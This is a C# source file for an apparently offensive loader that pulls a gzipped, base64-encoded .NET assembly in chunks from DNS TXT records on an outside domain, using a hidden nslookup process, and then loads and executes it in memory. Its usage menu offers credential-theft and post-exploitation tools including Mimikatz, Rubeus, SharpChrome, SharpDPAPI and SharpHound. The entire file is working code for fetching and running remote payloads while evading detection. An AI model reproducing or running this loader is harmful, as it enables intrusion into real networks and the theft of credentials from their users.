/*
-------------------- x64 platform ----------------
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:DNSExecuteAssembly.exe DNSExecuteAssembly.cs

*/

namespace DNSExecuteAssembly
{
    using System;
    using System.IO;
    using System.IO.Compression;
    using System.Reflection;
    using System.Net;
    using System.Diagnostics;
    using System.ComponentModel;
    using System.Collections.Generic;
    using System.Text.RegularExpressions;
    using System.Linq;

    class DNSExecuteAssembly
    {

        static string GetTxtRecords(string hostname)
        {
            string output;
            var startInfo = new ProcessStartInfo("nslookup");
            startInfo.Arguments = string.Format("-type=TXT {0}", hostname);
            startInfo.RedirectStandardOutput = true;
            startInfo.RedirectStandardError = true;
            startInfo.UseShellExecute = false;
            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
 
            using (var cmd = Process.Start(startInfo))
            {
                output = cmd.StandardOutput.ReadToEnd();
            }
            output = Regex.Replace(output, @"Server:\s*([A-Za-z0-9\.\r\n\s:]*)", "");
            output = Regex.Replace(output, @"[A-Za-z0-9\.\-]*\s*text =\s*""", "");
            output = Regex.Replace(output, @"([""\s])", "");

           
            return output;
        }

        static void Main(string[] args)
        {
            string assemblyPath = String.Empty;
            byte[] assemblyBytes;

            // Validating args
            if (args.Length == 0)
            {
                Console.WriteLine("Error: missing argument. Please specify an option");
                Console.WriteLine("Usage: DNSExecuteAssembly.exe <keyword> [args...]");
                Console.WriteLine("  keywords: iv = Inveigh");
                Console.WriteLine("            mk = Mimikatz");
                Console.WriteLine("            sb = Seatbelt");
                Console.WriteLine("            sc = SharpChrome");
                Console.WriteLine("            sd = SharpDPAPI");
                Console.WriteLine("            sh = SharpHound");
                Console.WriteLine("            sr = SharpRoast");
                Console.WriteLine("            ss = SharpSpray");
                Console.WriteLine("            su = SharpUp");
                Console.WriteLine("            sv = SharpView");
                Console.WriteLine("            sw = SharpWMI");
                Console.WriteLine("            ru = Rubeus");
                Console.WriteLine("            wt = Watson");
                return;
            }

            string SearchRecord = string.Format("{0}-cs.t.exploit.ph.", args[0]);
            string Record = GetTxtRecords(SearchRecord);
            int end = Int32.Parse(Record);
            IEnumerable<int> recordnums = Enumerable.Range(0, end);


            string EncodedAssembly = String.Empty;
            foreach (int num in recordnums)
            {
                string CurrentRecordHost = string.Format("{0}-{1}-cs.t.exploit.ph.", num, args[0]);
                string CurrentRecord = GetTxtRecords(CurrentRecordHost);
                EncodedAssembly = string.Concat(EncodedAssembly, CurrentRecord);
            }
            var CompressedAssembly = Convert.FromBase64String(EncodedAssembly);
            var bigStream = new GZipStream(new MemoryStream(CompressedAssembly), CompressionMode.Decompress);
            var bigStreamOut = new System.IO.MemoryStream();
            bigStream.CopyTo(bigStreamOut);
            assemblyBytes = bigStreamOut.ToArray();
            

            try
            {
                Assembly a = Assembly.Load(assemblyBytes);

                MethodInfo entryPoint = a.EntryPoint;
                if (entryPoint != null)
                {
                    MethodInfo method = a.EntryPoint;
                    object o = a.CreateInstance(method.Name);
                    object[] arr = new object[] { args.Skip(1).ToArray() };
                    method.Invoke(o, arr);
                }

            }
            catch (Exception ex)
            {
                while (ex != null)
                {
                    Console.WriteLine("[ERROR] " + ex.Message);
                    ex = ex.InnerException;
                }
            }
        }
    }
}
